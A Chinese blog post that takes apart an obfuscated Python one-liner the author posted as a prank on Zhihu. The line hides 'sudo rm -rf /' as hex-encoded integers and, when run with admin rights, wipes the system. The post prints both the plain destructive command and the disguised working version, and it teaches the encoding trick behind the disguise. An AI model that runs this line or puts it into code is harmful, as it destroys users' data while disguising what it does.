---
title: Python 乱码指北：一行删掉根目录
date: 2017-03-14 08:47:51
tags: Python
---

之前在知乎看到一个问题：<a href="https://www.zhihu.com/question/37046157" target="_blank">「一行 Python 代码可以实现什么丧心病狂的功能？」</a>，我看着好玩，写了一个答案：

> ```Python
> (lambda _: getattr(__import__(_(28531)), _(126965465245037))(_(9147569852652678349977498820655)))((lambda ___, __, _: lambda n: ___(__(n))[_ << _:-_].decode(___.__name__))(hex, long, True))
> ```
> OS X、Linux 有效，需要管理员权限执行，效果感人。
>
> 作者：xlzd
> 链接：<a href="https://www.zhihu.com/question/37046157/answer/101660005" target="_blank">https://www.zhihu.com/question/37046157/answer/101660005</a>
> 来源：知乎
> 著作权归作者所有，转载请联系作者获得授权。



原本只是一个恶搞的小玩笑，没想到真的有一个小伙伴试过了这行代码。然后，他的 Mac 被删光了所有东西…… 

那么，这行代码是如何做到的呢？


<!--more-->


----------


其实并不复杂，不过是一些代码的伪装罢了。这行代码翻译为最直接版本，也仅仅两行：

```Python
import os
os.system('sudo rm -rf /')
```



第一步，我们要省去 `import`，改成使用 `__import__` 函数，它接受一个字符串，并返回这个模块本身：

```Python
__import__('os').system('sudo rm -rf /')
```


OK，现在已经变成一行了，下面要做的，就是让它越发的看不懂。具体的思路是将尽可能多的内容转换为字符串，然后对字符串做转型，通过 `getattr` 函数，可以改写为如下：

```Python
getattr(__import__('os'), 'system')('sudo rm -rf /')
```



到这一步，先明白一点是 `lambda` 函数可以定义与执行放在一起的。同时，在 Python 中，函数是可以作为参数传递的：

```
In [1]: (lambda n: n*2) (2)
Out[1]: 4

In [2]: (lambda f: f('10')) (int)
Out[2]: 10
```

到这里，想办法将上面三个字符串 `os`, `system`, `sudo rm -rf /` 不再直接写出，而是转换为数字，然后传入一个函数对数字解码到字符串，暂且不关注这个函数的具体定义和数字是什么，之前的代码可以改写如下：


```
(lambda decode: getattr(__import__( decode(NUM1) ), decode(NUM2))(decode(NUM3))) (decode_function)
```

已经与回答中的代码越来越像了。那么，如何将字符串映射到一个数字呢？
```
In [3]: 'hello, world.'.encode('hex')
Out[3]: '68656c6c6f2c20776f726c642e'

In [4]: int('hello, world.'.encode('hex'), 16)
Out[4]: 8271117963530313756381553648686L

In [5]: hex(8271117963530313756381553648686L)[2:-1].decode('hex')
Out[5]: 'hello, world.'
```

于是，上面的 `decode_function` 和对应的数字便可以轻松得到了：
```
In [6]: encode = lambda s:int(s.encode('hex'), 16)

In [7]: decode = lambda x: hex(long(x))[2:-1].decode('hex')

In [8]: encode('os')
Out[8]: 28531

In [9]: decode(28531)
Out[9]: 'os'

In [10]: encode('system')
Out[10]: 126965465245037

In [11]: decode(126965465245037)
Out[11]: 'system'

In [12]: encode('sudo rm -rf /')
Out[12]: 9147569852652678349977498820655L

In [13]: decode(9147569852652678349977498820655L)
Out[13]: 'sudo rm -rf /'
```

填充到刚才的代码中去：
```
(lambda decode: getattr(__import__( decode(28531) ), decode(126965465245037))(decode(9147569852652678349977498820655L))) (lambda x: hex(long(x))[2:-1].decode('hex'))
```

最后我们再将 `decode` 改装一下，比如 `2 == True << True`（`True == 1`），而 `-1 == -True`，而字符串 `hex` 则可以通过函数 `hex` 的 `__name__` 获得。由此，将其作为参数传入一个 lambda 函数，返回我们需要的 `decode` 函数，`decode` 就变成了这样：
```
(lambda ___, __, _: lambda n: ___(__(n))[_ << _:-_].decode(___.__name__))(hex, long, True)
```

组装到一起，将变量名变成下划线，就得到了最终结果：
```
(lambda _: getattr(__import__(_(28531)), _(126965465245037))(_(9147569852652678349977498820655)))((lambda ___, __, _: lambda n: ___(__(n))[_ << _:-_].decode(___.__name__))(hex, long, True))
```

**友情提示：请不要轻易尝试。**
